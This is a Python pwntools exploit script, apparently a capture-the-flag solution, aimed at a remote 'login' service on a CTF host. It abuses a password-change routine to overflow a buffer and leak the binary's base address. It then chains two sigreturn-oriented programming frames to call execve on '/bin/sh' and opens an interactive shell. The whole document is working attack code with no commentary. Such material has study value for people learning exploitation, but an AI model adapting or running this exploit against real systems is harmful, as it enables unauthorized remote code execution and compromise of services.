#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./login")
context.binary = exe

#io = process('./login')
#io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 31293)

# register
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'user')
io.sendlineafter(b': ', b'pass')

# register
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b': ', b'0')

# change password
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'0')
io.sendlineafter(b': ', b'pass')
io.sendlineafter(b': ', b'a'*36)
io.sendlineafter(b': ', str(struct.unpack('<d', p64(0x6161616161616161))[0]).encode())

# leak
io.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
exe.address = unpack(io.recv(6), 'all')-0x21c2   
print(hex(exe.address))
# rop
vuln = exe.address+0x157a
io.sendlineafter(b'> ', b'1337')
frame = SigreturnFrame()
syscall = exe.address+0x157f
frame.rax = 0
frame.rdi = exe.address+0x4800-8
frame.rsi = exe.address+0x4800-8
frame.r10 = 100
frame.rsp = exe.address+0x4800
frame.rbp = exe.address+0x4800+0x190
frame.rip = exe.address+0x1552
padding = 408
srop = padding*b'\x00'+p64(exe.address+0x157a)+bytes(frame)
sleep(1)
io.send(srop+(0x400-len(srop))*b'\x00')
sleep(1)
io.sendafter(b': ', b'a'*15)
frame = SigreturnFrame()
frame.rdi = exe.address+0x4800+0x190
frame.rax = 59
frame.rdi = exe.address+0x4aa8 
frame.rip = syscall
srop = padding*b'\x00'+p64(exe.address+0x11a3)+p64(exe.address+0x4800+0x190)+p64(exe.address+0x1552)+bytes(frame)+b'/bin/sh\x00'
io.sendafter(b': ', srop+(0x400-len(srop))*b'\x00')
io.sendafter(b': ', b'a'*15)
io.interactive()
